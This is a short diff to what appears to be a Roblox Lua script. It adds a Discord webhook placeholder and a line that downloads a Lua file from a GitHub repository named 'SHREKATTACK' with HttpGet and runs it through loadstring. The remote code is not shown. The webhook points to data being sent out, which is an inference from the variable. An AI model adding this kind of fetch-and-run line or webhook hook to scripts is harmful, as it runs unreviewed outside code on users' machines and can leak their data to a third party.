@@ -1,3 +1,6 @@
+_G.webhooksdiscord = "YOUR URL WEBHOOK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 while wait() do
 
      pcall(function()
